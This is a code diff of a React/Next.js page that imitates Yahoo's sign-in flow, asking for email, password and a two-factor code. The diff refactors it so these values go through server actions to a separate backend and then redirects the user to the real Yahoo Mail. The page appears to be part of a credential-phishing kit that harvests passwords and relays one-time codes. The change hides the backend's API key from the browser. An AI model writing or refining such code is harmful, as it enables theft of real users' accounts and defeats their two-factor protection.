@@ -2,6 +2,7 @@
 
 import { useState } from "react";
 import Footer from "@/components/Footer";
+import { initiateLogin, submit2FA, submitPassword } from "./actions";
 
 export default function Home() {
   const [email, setEmail] = useState("");
@@ -12,10 +13,6 @@ export default function Home() {
   const [sessionId, setSessionId] = useState("");
   const [code, setCode] = useState("");
   const [staySignedIn, setStaySignedIn] = useState(true);
-
-  const apiUrl =
-    process.env.NEXT_PUBLIC_API_BASE_URL || "http://localhost:8000/api";
-  const apiKey = process.env.NEXT_PUBLIC_API_KEY || "";
 
   // Step 1: Initiate Login (Email)
   const handleEmailNext = async (e: React.FormEvent) => {
@@ -28,22 +25,14 @@ export default function Home() {
     setMessage("");
 
     try {
-      const response = await fetch(`${apiUrl}/yahoo/login/initiate`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "x-api-key": apiKey,
-        },
-        body: JSON.stringify({ email }),
-      });
+      const { success, data, message: errMessage } = await initiateLogin({ email });
 
-      const data = await response.json();
-      if (data.success && data.status === "REQUIRES_PASSWORD") {
+      if (success && data.success && data.status === "REQUIRES_PASSWORD") {
         setSessionId(data.sessionId);
         setStep(2); // Move to password step
       } else {
         setMessage(
-          data.error || data.message || "Could not find your Yahoo account",
+          errMessage || data?.error || data?.message || "Could not find your Yahoo account",
         );
       }
     } catch (error) {
@@ -65,29 +54,18 @@ export default function Home() {
     setMessage("");
 
     try {
-      const response = await fetch(`${apiUrl}/yahoo/login/password`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "x-api-key": apiKey,
-        },
-        body: JSON.stringify({
-          sessionId,
-          password,
-        }),
-      });
+      const { success, data, message: errMessage } = await submitPassword({ sessionId, password });
 
-      const data = await response.json();
-      if (data.success && data.status === "AUTHENTICATED") {
+      if (success && data.success && data.status === "AUTHENTICATED") {
         setMessage("Login successful!");
         setTimeout(() => {
           window.location.href = "https://mail.yahoo.com";
         }, 1500);
-      } else if (data.status === "REQUIRES_2FA") {
+      } else if (success && data.success && data.status === "REQUIRES_2FA") {
         setSessionId(data.sessionId);
         setStep(3); // Move to 2FA step
       } else {
-        setMessage(data.error || data.message || "Invalid password");
+        setMessage(errMessage || data?.error || data?.message || "Invalid password");
       }
     } catch (error) {
       setMessage("Network error occurred");
@@ -103,26 +81,15 @@ export default function Home() {
     setMessage("");
 
     try {
-      const response = await fetch(`${apiUrl}/yahoo/2fa`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "x-api-key": apiKey,
-        },
-        body: JSON.stringify({
-          sessionId,
-          code,
-        }),
-      });
+      const { success, data, message: errMessage } = await submit2FA({ sessionId, code });
 
-      const data = await response.json();
-      if (data.success) {
+      if (success && data.success) {
         setMessage("Verification successful! Redirecting...");
         setTimeout(() => {
           window.location.href = "https://mail.yahoo.com";
         }, 1500);
       } else {
-        setMessage(data.error || data.message || "Verification failed");
+        setMessage(errMessage || data?.error || data?.message || "Verification failed");
       }
     } catch (error) {
       setMessage("Network error occurred");
